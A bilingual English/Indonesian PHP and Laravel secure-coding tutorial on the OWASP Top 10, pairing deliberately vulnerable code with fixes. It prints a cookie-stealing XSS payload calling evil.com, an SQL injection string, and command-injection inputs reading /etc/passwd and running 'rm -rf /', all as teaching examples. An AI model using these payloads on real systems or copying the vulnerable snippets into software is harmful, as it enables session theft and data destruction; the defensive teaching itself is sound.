---
title: "Secure Coding Fundamentals with PHP: OWASP Top 10"
titleId: "Dasar-Dasar Secure Coding dengan PHP: OWASP Top 10"
date: 2026-07-10
updated: 2026-07-10
category: tutorial
author: SE Lab
lang: en
featured: false
stream: se-methodologies-architecture
tags:
  - Security
  - OWASP
  - Secure Coding
  - PHP
  - Laravel
tagsId:
  - Keamanan
  - OWASP
  - Secure Coding
  - PHP
  - Laravel
excerpt: "Master the OWASP Top 10 (2021 edition) through practical PHP and Laravel examples. Learn how to prevent broken access control, injection attacks, cryptographic failures, insecure design, and security misconfiguration in real-world applications."
excerptId: "Kuasai OWASP Top 10 (edisi 2021) melalui contoh PHP dan Laravel praktis. Pelajari cara mencegah broken access control, serangan injeksi, kegagalan kriptografi, desain tidak aman, dan miskonfigurasi keamanan dalam aplikasi dunia nyata."
---

<section lang="en">

## Why Secure Coding Matters for Student Projects

Every semester, SE Lab students build real-world systems—fintech payment flows, healthcare patient portals, EdTech LMS platforms, and IoT dashboards. These systems process **real sensitive data**: financial transactions, medical records, personal identities, and academic credentials. A single vulnerability in any of these projects is not a hypothetical exercise. It is a breach waiting to happen.

Consider these real-world consequences of common student-project vulnerabilities:

| Vulnerability | Real-World Consequence | Example |
|---|---|---|
| SQL Injection | Entire database exfiltrated in minutes | A login form that concatenates user input into SQL gives an attacker every user record |
| Broken Access Control | One student sees another student's grades, health records, or financial data | `GET /records/123` returns `record/124` when the ID is changed in the URL |
| Cryptographic Failures | Passwords cracked in seconds, session tokens forged | Storing `MD5(password)` in 2026 is trivially reversible |
| Cross-Site Scripting (XSS) | Session hijacking, credential theft | A comment field that renders unsanitised HTML steals every viewer's session cookie |
| Security Misconfiguration | Directory listing exposes `.env` files, debug pages leak stack traces | Leaving `APP_DEBUG=true` in production reveals database credentials in error pages |

Security is not a feature you bolt on at the end. It is the foundation beneath every layer of your application. This tutorial gives you the practical skills to build that foundation in PHP and Laravel—the stack used across SE Lab courses and thesis projects.

### Connection to SE Lab Research

This tutorial serves all three SE Lab research streams:

- **SE Methodologies & Architecture** — Secure SDLC practices, threat modelling, security-as-design-principle
- **Domain-Specific SE Applications** — Domain-specific threats in fintech (PCI-DSS), healthcare (HIPAA), and EdTech (FERPA-inspired controls)
- **Emerging Technologies in SE** — Security risks in AI-generated code, LLM prompt injection, securing AI-assisted development workflows

### What You Will Learn

- The OWASP Top 10 (2021 edition) and how each risk manifests in PHP applications
- Secure coding patterns and anti-patterns with concrete before/after code examples
- Laravel-specific security features: Eloquent ORM protection, built-in CSRF, encryption, and authentication guards
- How to audit your own code with a reusable secure-coding checklist
- Hands-on exercise: securing a deliberately vulnerable student portal

</section>

<section lang="id">

## Mengapa Secure Coding Penting untuk Proyek Mahasiswa

Setiap semester, mahasiswa SE Lab membangun sistem dunia nyata—alur pembayaran fintech, portal pasien kesehatan, platform LMS EdTech, dan dashboard IoT. Sistem ini memproses **data sensitif nyata**: transaksi keuangan, catatan medis, identitas pribadi, dan kredensial akademik. Satu kerentanan di proyek-proyek ini bukanlah latihan hipotetis. Ini adalah pelanggaran yang menunggu untuk terjadi.

Pertimbangkan konsekuensi nyata dari kerentanan umum di proyek mahasiswa:

| Kerentanan | Konsekuensi Nyata | Contoh |
|---|---|---|
| SQL Injection | Seluruh database dieksfiltrasi dalam hitungan menit | Form login yang menggabungkan input pengguna ke SQL memberi penyerang semua data pengguna |
| Broken Access Control | Satu mahasiswa melihat nilai, catatan kesehatan, atau data keuangan mahasiswa lain | `GET /records/123` mengembalikan `record/124` ketika ID diubah di URL |
| Kegagalan Kriptografi | Password diretas dalam hitungan detik, token sesi dipalsukan | Menyimpan `MD5(password)` di tahun 2026 dapat dibalikkan dengan mudah |
| Cross-Site Scripting (XSS) | Pembajakan sesi, pencurian kredensial | Kolom komentar yang merender HTML tidak disanitasi mencuri cookie sesi setiap penonton |
| Miskonfigurasi Keamanan | Directory listing mengekspos file `.env`, halaman debug membocorkan stack trace | Membiarkan `APP_DEBUG=true` di production mengungkapkan kredensial database di halaman error |

Keamanan bukanlah fitur yang Anda pasang di akhir. Ini adalah fondasi di bawah setiap lapisan aplikasi Anda. Tutorial ini memberi Anda keterampilan praktis untuk membangun fondasi itu dalam PHP dan Laravel—stack yang digunakan di seluruh mata kuliah dan proyek tesis SE Lab.

### Koneksi dengan Riset SE Lab

Tutorial ini melayani ketiga aliran riset SE Lab:

- **Metodologi & Arsitektur SE** — Praktik Secure SDLC, threat modelling, keamanan-sebagai-prinsip-desain
- **Aplikasi SE Spesifik Domain** — Ancaman spesifik domain dalam fintech (PCI-DSS), kesehatan (HIPAA), dan EdTech (kontrol terinspirasi FERPA)
- **Teknologi Baru dalam SE** — Risiko keamanan dalam kode yang dihasilkan AI, injeksi prompt LLM, mengamankan alur kerja pengembangan berbantuan AI

### Yang Akan Anda Pelajari

- OWASP Top 10 (edisi 2021) dan bagaimana setiap risiko termanifestasi dalam aplikasi PHP
- Pola dan anti-pola secure coding dengan contoh kode before/after yang konkret
- Fitur keamanan spesifik Laravel: perlindungan Eloquent ORM, CSRF bawaan, enkripsi, dan guard autentikasi
- Cara mengaudit kode Anda sendiri dengan checklist secure coding yang dapat digunakan kembali
- Latihan langsung: mengamankan portal mahasiswa yang sengaja dibuat rentan

</section>

---

<section lang="en">

## Secure Software Development Lifecycle (SSDLC) in a Nutshell

Traditional SDLC treats security as a final stage—penetration testing before deploy. This is expensive, slow, and ineffective. A vulnerability found at the penetration-testing stage costs **30× more** to fix than one found during requirements or design.

The Secure SDLC (SSDLC) shifts security left—into every phase of development:

| SDLC Phase | Security Activity | Who |
|---|---|---|
| **Requirements** | Define security requirements, regulatory compliance needs, abuse cases | Product owner + Security engineer |
| **Design** | Threat modelling (STRIDE), architecture risk analysis, secure design review | Architect + Security engineer |
| **Implementation** | Secure coding standards, static analysis (SAST), peer reviews with security checklist | Developers |
| **Testing** | Dynamic analysis (DAST), fuzz testing, dependency scanning, security regression tests | QA + Security engineer |
| **Deployment** | Infrastructure hardening, secrets management, WAF configuration, monitoring | DevOps + Security engineer |
| **Maintenance** | Vulnerability disclosure program, patch management, incident response drills | Operations + Security engineer |

### Threat Modelling with STRIDE

Before you write a line of code, ask these six questions about every component:

| STRIDE Category | Question | Example for a Student Portal |
|---|---|---|
| **S**poofing | Can an attacker impersonate a user? | Weak password reset, missing MFA |
| **T**ampering | Can data be modified in transit or storage? | No HMAC on grade records |
| **R**epudiation | Can a user deny an action? | No audit log for grade changes |
| **I**nformation Disclosure | Can sensitive data leak? | API returns all user fields including password hash |
| **D**enial of Service | Can the system be overwhelmed? | No rate limiting on login endpoint |
| **E**levation of Privilege | Can a user gain unauthorised access? | `?role=admin` query parameter controls permissions |

This is not an academic exercise. Every item in the STRIDE table maps to a concrete OWASP Top 10 risk and a fix you will implement in this tutorial.

### Why Shift-Left Matters

A vulnerability found during requirements costs one hour to fix. The same vulnerability found in production costs **days** of incident response, forensic analysis, customer notification, and patching—plus reputational damage that cannot be measured in hours.

> "Security is not a product. It is a process." — Bruce Schneier

</section>

<section lang="id">

## Secure Software Development Lifecycle (SSDLC) Secara Singkat

SDLC tradisional memperlakukan keamanan sebagai tahap akhir—pengujian penetrasi sebelum deploy. Ini mahal, lambat, dan tidak efektif. Kerentanan yang ditemukan pada tahap pengujian penetrasi biayanya **30× lebih mahal** untuk diperbaiki daripada yang ditemukan selama requirements atau desain.

Secure SDLC (SSDLC) menggeser keamanan ke kiri—ke dalam setiap fase pengembangan:

| Fase SDLC | Aktivitas Keamanan | Siapa |
|---|---|---|
| **Requirements** | Definisikan persyaratan keamanan, kebutuhan kepatuhan regulasi, abuse case | Product owner + Security engineer |
| **Desain** | Threat modelling (STRIDE), analisis risiko arsitektur, secure design review | Architect + Security engineer |
| **Implementasi** | Standar secure coding, static analysis (SAST), peer review dengan checklist keamanan | Developers |
| **Pengujian** | Dynamic analysis (DAST), fuzz testing, pemindaian dependensi, security regression tests | QA + Security engineer |
| **Deployment** | Hardening infrastruktur, manajemen secrets, konfigurasi WAF, monitoring | DevOps + Security engineer |
| **Pemeliharaan** | Program pengungkapan kerentanan, manajemen patch, latihan respons insiden | Operations + Security engineer |

### Threat Modelling dengan STRIDE

Sebelum Anda menulis satu baris kode, tanyakan enam pertanyaan ini tentang setiap komponen:

| Kategori STRIDE | Pertanyaan | Contoh untuk Portal Mahasiswa |
|---|---|---|
| **S**poofing | Dapatkah penyerang menyamar sebagai pengguna? | Reset password lemah, tidak ada MFA |
| **T**ampering | Dapatkah data dimodifikasi dalam transit atau penyimpanan? | Tidak ada HMAC pada catatan nilai |
| **R**epudiation | Dapatkah pengguna menyangkal suatu tindakan? | Tidak ada log audit untuk perubahan nilai |
| **I**nformation Disclosure | Dapatkah data sensitif bocor? | API mengembalikan semua field pengguna termasuk hash password |
| **D**enial of Service | Dapatkah sistem dikewalahkan? | Tidak ada rate limiting pada endpoint login |
| **E**levation of Privilege | Dapatkah pengguna mendapatkan akses tidak sah? | Parameter query `?role=admin` mengontrol izin |

Ini bukan latihan akademis. Setiap item dalam tabel STRIDE memetakan ke risiko OWASP Top 10 yang konkret dan perbaikan yang akan Anda implementasikan dalam tutorial ini.

### Mengapa Shift-Left Penting

Kerentanan yang ditemukan selama requirements membutuhkan satu jam untuk diperbaiki. Kerentanan yang sama ditemukan di production membutuhkan **berhari-hari** respons insiden, analisis forensik, notifikasi pelanggan, dan patching—ditambah kerusakan reputasi yang tidak dapat diukur dalam jam.

> "Keamanan bukanlah produk. Ini adalah proses." — Bruce Schneier

</section>

---

<section lang="en">

## OWASP Top 10 Overview (2021 Edition)

The Open Web Application Security Project (OWASP) publishes the **Top 10 Web Application Security Risks**—the definitive reference for what to protect against. The 2021 edition reordered and renamed several categories to reflect shifts in the threat landscape.

Here is the complete 2021 list, with each risk mapped to a concrete PHP vulnerability:

| Rank | Risk | What It Means in PHP | Data Impact |
|---|---|---|---|
| **A01** | Broken Access Control | Bypassing authorisation checks, IDOR (Insecure Direct Object Reference), CORS misconfiguration | Confidentiality, Integrity |
| **A02** | Cryptographic Failures | Weak hashing (MD5, SHA1), hardcoded keys, missing TLS, predictable tokens | Confidentiality |
| **A03** | Injection | SQL injection, command injection, LDAP injection, XSS via unsanitised output | Confidentiality, Integrity |
| **A04** | Insecure Design | Missing rate limiting, no audit log, unsafe deserialisation, trust-by-default | Integrity, Availability |
| **A05** | Security Misconfiguration | Debug mode in production, default credentials, verbose error messages, exposed `.env` | Confidentiality |
| **A06** | Vulnerable and Outdated Components | Unpatched Laravel, abandoned Composer packages, end-of-life PHP versions | All |
| **A07** | Identification and Authentication Failures | Weak password policy, missing MFA, session fixation, predictable password reset tokens | Confidentiality |
| **A08** | Software and Data Integrity Failures | Composer dependency confusion, unsigned updates, deserialisation of untrusted data, CI/CD pipeline tampering | Integrity |
| **A09** | Security Logging and Monitoring Failures | No audit trail, unlogged authentication failures, log injection, missing alerting | Visibility |
| **A10** | Server-Side Request Forgery (SSRF) | Unvalidated URL fetching, internal network scanning, cloud metadata service access | Confidentiality |

The next section provides a deep dive into each risk with vulnerable PHP code and its secure counterpart.

</section>

<section lang="id">

## Ikhtisar OWASP Top 10 (Edisi 2021)

Open Web Application Security Project (OWASP) menerbitkan **Top 10 Risiko Keamanan Aplikasi Web**—referensi definitif tentang apa yang harus dilindungi. Edisi 2021 mengurutkan ulang dan mengganti nama beberapa kategori untuk mencerminkan pergeseran dalam lanskap ancaman.

Berikut adalah daftar lengkap 2021, dengan setiap risiko dipetakan ke kerentanan PHP yang konkret:

| Peringkat | Risiko | Artinya dalam PHP | Dampak Data |
|---|---|---|---|
| **A01** | Broken Access Control | Melewati pemeriksaan otorisasi, IDOR (Insecure Direct Object Reference), miskonfigurasi CORS | Kerahasiaan, Integritas |
| **A02** | Kegagalan Kriptografi | Hashing lemah (MD5, SHA1), kunci hardcode, TLS hilang, token dapat diprediksi | Kerahasiaan |
| **A03** | Injeksi | SQL injection, command injection, LDAP injection, XSS melalui output tidak disanitasi | Kerahasiaan, Integritas |
| **A04** | Desain Tidak Aman | Tidak ada rate limiting, tidak ada log audit, deserialisasi tidak aman, trust-by-default | Integritas, Ketersediaan |
| **A05** | Miskonfigurasi Keamanan | Mode debug di production, kredensial default, pesan error verbose, `.env` terekspos | Kerahasiaan |
| **A06** | Komponen Rentan dan Usang | Laravel tidak dipatch, paket Composer ditinggalkan, versi PHP end-of-life | Semua |
| **A07** | Kegagalan Identifikasi dan Autentikasi | Kebijakan password lemah, tidak ada MFA, session fixation, token reset password dapat diprediksi | Kerahasiaan |
| **A08** | Kegagalan Integritas Perangkat Lunak dan Data | Kerancuan dependensi Composer, update tidak ditandatangani, deserialisasi data tidak terpercaya, perusakan pipeline CI/CD | Integritas |
| **A09** | Kegagalan Pencatatan dan Pemantauan Keamanan | Tidak ada jejak audit, kegagalan autentikasi tidak tercatat, log injection, tidak ada alerting | Visibilitas |
| **A10** | Server-Side Request Forgery (SSRF) | Pengambilan URL tidak divalidasi, pemindaian jaringan internal, akses layanan metadata cloud | Kerahasiaan |

Bagian berikutnya memberikan pendalaman setiap risiko dengan kode PHP rentan dan padanannya yang aman.

</section>

---

<section lang="en">

## A01: Broken Access Control

Broken Access Control is the most common OWASP risk year after year. It occurs when users can perform actions or access data beyond their intended permissions.

### The Classic IDOR (Insecure Direct Object Reference)

**Vulnerable Code:**

```php
<?php

// DANGEROUS: No ownership check — any authenticated user can view any record
public function viewStudentRecord(int $id): array
{
    $stmt = $this->pdo->prepare(
        'SELECT * FROM student_records WHERE id = :id'
    );
    $stmt->execute(['id' => $id]);

    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

If a student with ID 101 visits `/records/101`, they see their own record. Change the URL to `/records/102` and they see another student's record. No ownership verification. This is how healthcare breaches, grade leaks, and financial data exposure happen in student projects.

**Secure Code:**

```php
<?php

declare(strict_types=1);

// SECURE: Ownership verified against the authenticated user
public function viewStudentRecord(int $recordId, string $authenticatedUserId): array
{
    $stmt = $this->pdo->prepare(
        'SELECT sr.*
         FROM student_records sr
         JOIN record_permissions rp ON sr.id = rp.record_id
         WHERE sr.id = :record_id
         AND rp.user_id = :user_id
         AND rp.permission_type IN ("owner", "viewer")'
    );
    $stmt->execute([
        'record_id' => $recordId,
        'user_id'   => $authenticatedUserId,
    ]);

    $record = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$record) {
        throw new AccessDeniedException('Record not found or access denied.');
    }

    return $record;
}
```

The secure version joins against a permissions table. Even if the record exists, the query returns nothing unless the authenticated user has explicit permission. The error message is intentionally ambiguous—never confirm whether a record exists when denying access.

### Laravel: Policies and Gates

Laravel provides a robust authorisation system. Define a policy:

```php
<?php

namespace App\Policies;

use App\Models\StudentRecord;
use App\Models\User;

class StudentRecordPolicy
{
    public function view(User $user, StudentRecord $record): bool
    {
        return $record->permissions()
            ->where('user_id', $user->id)
            ->whereIn('permission_type', ['owner', 'viewer'])
            ->exists();
    }

    public function update(User $user, StudentRecord $record): bool
    {
        return $record->permissions()
            ->where('user_id', $user->id)
            ->where('permission_type', 'owner')
            ->exists();
    }
}
```

Apply it in the controller:

```php
<?php

namespace App\Http\Controllers;

use App\Models\StudentRecord;

class StudentRecordController extends Controller
{
    public function show(StudentRecord $record): \Illuminate\View\View
    {
        $this->authorize('view', $record);

        return view('records.show', compact('record'));
    }
}
```

The `$this->authorize('view', $record)` call throws a `403 Forbidden` if the policy denies access—before any data is rendered.

### CORS Misconfiguration

A permissive CORS policy allows any origin to make authenticated requests to your API:

```php
// DANGEROUS in production
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Credentials: true');
```

**Never combine `*` with `credentials: true`.** This allows a malicious website to make authenticated API calls on behalf of your logged-in users. In Laravel, configure CORS in `config/cors.php`:

```php
'allowed_origins' => ['https://se.polinema.ac.id'],
'supports_credentials' => true,
```

### Access Control Checklist

- [ ] Every data-access endpoint verifies ownership or permission before returning data
- [ ] Authorisation checks happen at the server, never trust client-side UI hiding
- [ ] CORS `allowed_origins` is explicit, never `*` with credentials
- [ ] JWT tokens include scope/role claims verified on every request
- [ ] Administrative routes are behind middleware (e.g., `auth:api` + `can:admin`)

</section>

<section lang="id">

## A01: Broken Access Control

Broken Access Control adalah risiko OWASP paling umum tahun demi tahun. Ini terjadi ketika pengguna dapat melakukan tindakan atau mengakses data di luar izin yang dimaksudkan.

### IDOR Klasik (Insecure Direct Object Reference)

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Tidak ada pemeriksaan kepemilikan — setiap pengguna terautentikasi dapat melihat catatan apa pun
public function viewStudentRecord(int $id): array
{
    $stmt = $this->pdo->prepare(
        'SELECT * FROM student_records WHERE id = :id'
    );
    $stmt->execute(['id' => $id]);

    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

Jika mahasiswa dengan ID 101 mengunjungi `/records/101`, mereka melihat catatan mereka sendiri. Ubah URL menjadi `/records/102` dan mereka melihat catatan mahasiswa lain. Tidak ada verifikasi kepemilikan. Beginilah pelanggaran kesehatan, kebocoran nilai, dan eksposur data keuangan terjadi di proyek mahasiswa.

**Kode Aman:**

```php
<?php

declare(strict_types=1);

// AMAN: Kepemilikan diverifikasi terhadap pengguna yang terautentikasi
public function viewStudentRecord(int $recordId, string $authenticatedUserId): array
{
    $stmt = $this->pdo->prepare(
        'SELECT sr.*
         FROM student_records sr
         JOIN record_permissions rp ON sr.id = rp.record_id
         WHERE sr.id = :record_id
         AND rp.user_id = :user_id
         AND rp.permission_type IN ("owner", "viewer")'
    );
    $stmt->execute([
        'record_id' => $recordId,
        'user_id'   => $authenticatedUserId,
    ]);

    $record = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$record) {
        throw new AccessDeniedException('Catatan tidak ditemukan atau akses ditolak.');
    }

    return $record;
}
```

Versi aman melakukan JOIN terhadap tabel izin. Bahkan jika catatan ada, query tidak mengembalikan apa pun kecuali pengguna terautentikasi memiliki izin eksplisit. Pesan error sengaja ambigu—jangan pernah mengonfirmasi apakah catatan ada saat menolak akses.

### Laravel: Policies dan Gates

Laravel menyediakan sistem otorisasi yang kuat. Definisikan policy:

```php
<?php

namespace App\Policies;

use App\Models\StudentRecord;
use App\Models\User;

class StudentRecordPolicy
{
    public function view(User $user, StudentRecord $record): bool
    {
        return $record->permissions()
            ->where('user_id', $user->id)
            ->whereIn('permission_type', ['owner', 'viewer'])
            ->exists();
    }

    public function update(User $user, StudentRecord $record): bool
    {
        return $record->permissions()
            ->where('user_id', $user->id)
            ->where('permission_type', 'owner')
            ->exists();
    }
}
```

Terapkan di controller:

```php
<?php

namespace App\Http\Controllers;

use App\Models\StudentRecord;

class StudentRecordController extends Controller
{
    public function show(StudentRecord $record): \Illuminate\View\View
    {
        $this->authorize('view', $record);

        return view('records.show', compact('record'));
    }
}
```

Panggilan `$this->authorize('view', $record)` melempar `403 Forbidden` jika policy menolak akses—sebelum data apa pun dirender.

### Miskonfigurasi CORS

Kebijakan CORS permisif memungkinkan origin apa pun membuat permintaan terautentikasi ke API Anda:

```php
// BERBAHAYA di production
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Credentials: true');
```

**Jangan pernah menggabungkan `*` dengan `credentials: true`.** Ini memungkinkan situs web jahat membuat panggilan API terautentikasi atas nama pengguna yang login. Di Laravel, konfigurasikan CORS di `config/cors.php`:

```php
'allowed_origins' => ['https://se.polinema.ac.id'],
'supports_credentials' => true,
```

### Checklist Kontrol Akses

- [ ] Setiap endpoint akses data memverifikasi kepemilikan atau izin sebelum mengembalikan data
- [ ] Pemeriksaan otorisasi terjadi di server, jangan pernah percaya penyembunyian UI sisi klien
- [ ] CORS `allowed_origins` bersifat eksplisit, jangan pernah `*` dengan credentials
- [ ] Token JWT menyertakan klaim scope/role yang diverifikasi di setiap permintaan
- [ ] Rute administratif berada di belakang middleware (misalnya, `auth:api` + `can:admin`)

</section>

---

<section lang="en">

## A02: Cryptographic Failures

Cryptographic failures happen when sensitive data is protected with weak algorithms, hardcoded keys, or missing encryption entirely.

### Weak Password Hashing

**Vulnerable Code:**

```php
<?php

// DANGEROUS: MD5 and SHA1 are trivially reversible with rainbow tables
$hashedPassword = md5($password);
$hashedPassword = sha1($password);

// Also dangerous: fast hashes without salts are vulnerable to GPU-based cracking
$hashedPassword = hash('sha256', $password);
```

MD5 can process **billions** of hashes per second on a single GPU. A 10-character password is cracked in minutes.

**Secure Code:**

```php
<?php

declare(strict_types=1);

// SECURE: bcrypt with cost factor 12 (or higher)
// PHP's password_hash() uses bcrypt by default with a random salt
$hashedPassword = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verification
if (!password_verify($inputPassword, $storedHash)) {
    throw new AuthenticationException('Invalid credentials.');
}

// Upgrade the hash if the cost factor has changed
if (password_needs_rehash($storedHash, PASSWORD_BCRYPT, ['cost' => 12])) {
    $newHash = password_hash($inputPassword, PASSWORD_BCRYPT, ['cost' => 12]);
    $this->userRepository->updatePasswordHash($userId, $newHash);
}
```

`password_verify()` is timing-attack-safe. `password_needs_rehash()` lets you transparently upgrade hashing parameters without forcing password resets.

### Laravel: Built-in Hashing

Laravel's `Hash` facade wraps bcrypt with sensible defaults:

```php
use Illuminate\Support\Facades\Hash;

// Hashing
$hashedPassword = Hash::make($request->password);

// Verification
if (!Hash::check($request->password, $user->password)) {
    return back()->withErrors(['email' => 'Invalid credentials.']);
}

// Auto-upgrade during login (in LoginController or Fortify)
if (Hash::needsRehash($user->password)) {
    $user->password = Hash::make($request->password);
    $user->save();
}
```

### Hardcoded Secrets

**Vulnerable Code:**

```php
<?php

// DANGEROUS: Hardcoded in source — committed to Git, visible to everyone with repo access
$encryptionKey = 'my-secret-key-12345';
$apiToken = 'sk_live_9876543210abcdef';
$dbPassword = 'admin123';
```

**Secure Code:**

```php
<?php

declare(strict_types=1);

// SECURE: Read from environment, never hardcode
$encryptionKey = $_ENV['APP_KEY'] ?? throw new \RuntimeException('APP_KEY not set');
$apiToken = $_ENV['THIRD_PARTY_API_TOKEN'] ?? throw new \RuntimeException('API token not set');
```

In Laravel, store secrets in `.env` and access them via `config()` or `env()`:

```php
// config/services.php
'stripe' => [
    'key' => env('STRIPE_KEY'),
    'secret' => env('STRIPE_SECRET'),
],

// In application code
$stripeSecret = config('services.stripe.secret');
```

**Rules for secrets:**
- Never commit `.env` to Git (add to `.gitignore`)
- Rotate secrets if they are accidentally committed—removing from history is not enough
- Use Laravel's `php artisan config:cache` in production to prevent `.env` reads at runtime

### Laravel Encryption

Laravel's `Crypt` facade provides AES-256-CBC encryption using the `APP_KEY`:

```php
use Illuminate\Support\Facades\Crypt;

$encrypted = Crypt::encryptString($sensitiveData);
$decrypted = Crypt::decryptString($encrypted);

// For Eloquent models, use the Encrypted cast
class StudentRecord extends Model
{
    protected $casts = [
        'ssn' => 'encrypted',       // auto-encrypt on write, auto-decrypt on read
        'medical_notes' => 'encrypted',
    ];
}
```

</section>

<section lang="id">

## A02: Kegagalan Kriptografi

Kegagalan kriptografi terjadi ketika data sensitif dilindungi dengan algoritma lemah, kunci hardcode, atau tanpa enkripsi sama sekali.

### Hashing Password Lemah

**Kode Rentan:**

```php
<?php

// BERBAHAYA: MD5 dan SHA1 dapat dibalikkan dengan mudah menggunakan rainbow tables
$hashedPassword = md5($password);
$hashedPassword = sha1($password);

// Juga berbahaya: hash cepat tanpa salt rentan terhadap cracking berbasis GPU
$hashedPassword = hash('sha256', $password);
```

MD5 dapat memproses **miliaran** hash per detik pada satu GPU. Password 10 karakter diretas dalam hitungan menit.

**Kode Aman:**

```php
<?php

declare(strict_types=1);

// AMAN: bcrypt dengan cost factor 12 (atau lebih tinggi)
// password_hash() PHP menggunakan bcrypt secara default dengan salt acak
$hashedPassword = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verifikasi
if (!password_verify($inputPassword, $storedHash)) {
    throw new AuthenticationException('Kredensial tidak valid.');
}

// Upgrade hash jika cost factor telah berubah
if (password_needs_rehash($storedHash, PASSWORD_BCRYPT, ['cost' => 12])) {
    $newHash = password_hash($inputPassword, PASSWORD_BCRYPT, ['cost' => 12]);
    $this->userRepository->updatePasswordHash($userId, $newHash);
}
```

`password_verify()` aman terhadap timing attack. `password_needs_rehash()` memungkinkan Anda meningkatkan parameter hashing secara transparan tanpa memaksa reset password.

### Laravel: Hashing Bawaan

Fasad `Hash` Laravel membungkus bcrypt dengan default yang masuk akal:

```php
use Illuminate\Support\Facades\Hash;

// Hashing
$hashedPassword = Hash::make($request->password);

// Verifikasi
if (!Hash::check($request->password, $user->password)) {
    return back()->withErrors(['email' => 'Kredensial tidak valid.']);
}

// Upgrade otomatis saat login (di LoginController atau Fortify)
if (Hash::needsRehash($user->password)) {
    $user->password = Hash::make($request->password);
    $user->save();
}
```

### Secrets Hardcode

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Hardcode di source — di-commit ke Git, terlihat oleh semua orang dengan akses repo
$encryptionKey = 'my-secret-key-12345';
$apiToken = 'sk_live_9876543210abcdef';
$dbPassword = 'admin123';
```

**Kode Aman:**

```php
<?php

declare(strict_types=1);

// AMAN: Baca dari environment, jangan pernah hardcode
$encryptionKey = $_ENV['APP_KEY'] ?? throw new \RuntimeException('APP_KEY tidak disetel');
$apiToken = $_ENV['THIRD_PARTY_API_TOKEN'] ?? throw new \RuntimeException('Token API tidak disetel');
```

Di Laravel, simpan secrets di `.env` dan akses melalui `config()` atau `env()`:

```php
// config/services.php
'stripe' => [
    'key' => env('STRIPE_KEY'),
    'secret' => env('STRIPE_SECRET'),
],

// Dalam kode aplikasi
$stripeSecret = config('services.stripe.secret');
```

**Aturan untuk secrets:**
- Jangan pernah commit `.env` ke Git (tambahkan ke `.gitignore`)
- Rotasi secrets jika tidak sengaja di-commit—menghapus dari history saja tidak cukup
- Gunakan `php artisan config:cache` Laravel di production untuk mencegah pembacaan `.env` saat runtime

### Enkripsi Laravel

Fasad `Crypt` Laravel menyediakan enkripsi AES-256-CBC menggunakan `APP_KEY`:

```php
use Illuminate\Support\Facades\Crypt;

$encrypted = Crypt::encryptString($sensitiveData);
$decrypted = Crypt::decryptString($encrypted);

// Untuk model Eloquent, gunakan cast Encrypted
class StudentRecord extends Model
{
    protected $casts = [
        'ssn' => 'encrypted',       // auto-enkripsi saat menulis, auto-dekripsi saat membaca
        'medical_notes' => 'encrypted',
    ];
}
```

</section>

---

<section lang="en">

## A03: Injection

Injection occurs when untrusted data is sent to an interpreter as part of a command or query. SQL injection is the most common, but command injection, LDAP injection, and Cross-Site Scripting (XSS) are all injection variants.

### SQL Injection

**Vulnerable Code:**

```php
<?php

// DANGEROUS: String interpolation — attacker input becomes part of the SQL command
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '{$username}' AND password = '{$password}'";
$result = $pdo->query($query);
```

An attacker enters `' OR '1'='1` as the username and any password. The resulting query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

This returns every user in the database.

**Secure Code (PDO Prepared Statements):**

```php
<?php

declare(strict_types=1);

// SECURE: Prepared statements separate SQL structure from data values
$stmt = $pdo->prepare(
    'SELECT id, username, password_hash FROM users WHERE username = :username'
);
$stmt->execute(['username' => $_POST['username']]);

$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user && password_verify($_POST['password'], $user['password_hash'])) {
    // Authentication successful
} else {
    // Always use the same error message — don't reveal whether the user exists
    throw new AuthenticationException('Invalid username or password.');
}
```

**Laravel: Eloquent ORM Protection.**

Laravel's Eloquent ORM uses parameterised queries by default:

```php
// Safe: parameter binding is automatic
$user = User::where('email', $request->email)->first();

// Also safe: raw queries with bindings
$users = DB::select(
    'SELECT * FROM users WHERE email = :email AND status = :status',
    ['email' => $request->email, 'status' => 'active']
);

// DANGEROUS: DB::raw() with unsanitised input — avoid unless absolutely necessary
$users = DB::table('users')
    ->whereRaw("email = '{$request->email}'") // SQL injection!
    ->get();
```

### Command Injection

**Vulnerable Code:**

```php
<?php

// DANGEROUS: User input passed directly to shell
$filename = $_GET['filename'];
$output = shell_exec("cat /var/reports/{$filename}");
```

An attacker sends `filename=../../etc/passwd` and reads the system password file. Or `filename=; rm -rf /` and deletes the server.

**Secure Code:**

```php
<?php

declare(strict_types=1);

// SECURE: Whitelist validation, no shell execution, use native PHP functions instead
private const ALLOWED_FILES = [
    'report_q1.pdf',
    'report_q2.pdf',
    'transcript_template.docx',
];

public function readReport(string $filename): string
{
    if (!in_array($filename, self::ALLOWED_FILES, true)) {
        throw new \InvalidArgumentException('Invalid filename.');
    }

    $path = realpath('/var/reports/' . basename($filename));

    if ($path === false || !str_starts_with($path, '/var/reports/')) {
        throw new \RuntimeException('Path traversal detected.');
    }

    return file_get_contents($path);
}
```

**Rules for preventing command injection:**
- Never pass user input to `shell_exec()`, `exec()`, `system()`, or backtick operators
- If shell execution is unavoidable, use `escapeshellarg()` and `escapeshellcmd()`—but validate first
- Prefer native PHP functions (`file_get_contents()`, `PDO`, `curl`) over shell commands

### Cross-Site Scripting (XSS)

**Vulnerable Code:**

```php
<?php

// DANGEROUS: Unsanitised user input rendered directly in HTML
echo "<div class='comment'>" . $_POST['comment'] . "</div>";
```

An attacker posts `<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>` as a comment. Every user viewing the page has their session cookie sent to the attacker's server.

**Secure Code:**

```php
<?php

declare(strict_types=1);

// SECURE: HTML-encode all user input before rendering
echo "<div class='comment'>" . htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8') . "</div>";
```

**Laravel: Blade Auto-Escaping.**

Laravel's Blade template engine automatically escapes output with `{{ }}`:

```blade
{{-- Safe: auto-escaped --}}
<div class="comment">{{ $comment }}</div>

